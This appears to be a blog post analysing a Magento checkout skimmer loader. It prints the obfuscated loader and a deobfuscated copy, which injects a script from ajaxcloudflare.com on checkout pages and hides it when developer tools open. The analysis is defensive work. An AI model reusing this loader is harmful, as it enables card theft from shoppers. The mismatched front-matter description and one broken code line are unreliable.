---
layout: post
title: "Analyzing Magento skimmer"
categories: [Bot]
tags: [Javascript, ExpressJS]
description: In this blog post, we show how to create a simple ExpressJS middleware to detect bots.
---

According to this tweet the skimmer loader was available on facelook.no/en_US/pixel.js

<img src="/assets/media/tweet_skimmer.png"> 

We obtain a (slightly) obfuscated file with the following content:
```javascript
var a0a=['loud','lize','oudf','/wid','item','e-st','//aj','.com','lare','ckou','scri','ntBy','bute','/cdn','atic','|one','chec','appe','este','rHei','ndCh','setA','ntsB','head','clou','eche','emen','kout','/scr','leme','rWid','bug','Fire','flar','5d/c','-cgi','chro','loca','/103','epag','cart','onep','src','step','getE','isIn','itia','teEl','crea','test','ttri','yTag','rHTM','|fir','age|','ght','49f5','ipts','t|on','get.','pche','ild','oute','Name','inne','axcl','tion'];(function(a,b){var c=function(d){while(--d){a['push'](a['shift']());}};c(++b);}(a0a,0x1e0));var a0b=function(a,b){a=a-0x0;var c=a0a[a];return c;};function a0c(){var a=window[a0b('0x33')+a0b('0x13')+'th']-window[a0b('0x35')+a0b('0x13')+'th']>0xa0;var b=window[a0b('0x33')+a0b('0x8')+a0b('0x2c')]-window[a0b('0x35')+a0b('0x8')+a0b('0x2c')]>0xa0;return!(b&&a||!(window[a0b('0x15')+a0b('0x14')]&&window[a0b('0x15')+a0b('0x14')][a0b('0x19')+'me']&&window[a0b('0x15')+a0b('0x14')][a0b('0x19')+'me'][a0b('0x22')+a0b('0x23')+a0b('0x39')+'d']||a||b));}if(new RegExp(a0b('0x1e')+a0b('0x2b')+a0b('0x5')+a0b('0x10')+a0b('0x4')+a0b('0x20')+a0b('0x2a')+a0b('0xe')+a0b('0x41')+a0b('0x2f')+a0b('0x7')+a0b('0x31')+a0b('0x41')+a0b('0x2f')+a0b('0x1c')+a0b('0xe')+a0b('0x41')+'t')[a0b('0x26')](window[a0b('0x1a')+a0b('0x37')])&&!new RegExp(a0b('0x1d'))[a0b('0x26')](window[a0b('0x1a')+a0b('0x37')])){var a0d=document[a0b('0x25')+a0b('0x24')+a0b('0xf')+'t'](a0b('0x42')+'pt');var a0e=a0b('0x3e')+a0b('0x36')+a0b('0x3a')+a0b('0x40')+a0b('0x3f')+a0b('0x2')+a0b('0x18')+a0b('0x11')+a0b('0x2e')+a0b('0x1b')+a0b('0x2d')+a0b('0x17')+a0b('0x38')+a0b('0x16')+a0b('0x3d')+a0b('0x3')+a0b('0x3b')+a0b('0x30')+'js';a0d[a0b('0xa')+a0b('0x27')+a0b('0x1')](a0b('0x1f'),a0e);a0d[a0b('0xa')+a0b('0x27')+a0b('0x1')]('id',a0b('0xd')+'d');document[a0b('0x21')+a0b('0x12')+a0b('0xb')+a0b('0x28')+a0b('0x34')](a0b('0xc'))[a0b('0x3c')](0x0)[a0b('0x6')+a0b('0x9')+a0b('0x32')](a0d);numInterval=setInterval(function(){if(a0c()){if(document[a0b('0x21')+a0b('0x12')+a0b('0x0')+'Id'](a0b('0xd')+'d')){document[a0b('0x21')+a0b('0x12')+a0b('0x0')+'Id'](a0b('0xd')+'d')[a0b('0x33')+a0b('0x29')+'L']='';}}},0x12c);}
```

I went on https://lelinhtinh.github.io/de4js/ that enables to easily deobfuscate JS programs depending on the obfuscator that was used to obfuscated it.
After playing with the different options, we notice it was obfuscated using <a href="https://obfuscator.io/">obfuscator.io</a>

Once deobfuscated, you obtain the following file:
```javascript
function a0c() {
    var a = window.outerWidth - window.innerWidth > 160;
    var b = window.outerHeight - window.innerHeight > 160;
    return !(b && a || !(window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || a || b));
}
if (new RegExp('onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout').test(window.location) && !new RegExp('cart').test(window.location)) {
    var a0d = document.createElement('script');
    var a0e = '//ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js';
    a0d.setAttribute('src', a0e);
    a0d.setAttribute('id', 'cloud');
    document.getElementsByTagName('head').item 0. appendChild(a0d);
    numInterval = setInterval(function () {
        if (a0c()) {
            if (document.getElementById('cloud')) {
                document.getElementById('cloud').outerHTML = '';
            }
        }
    }, 300);
}
```

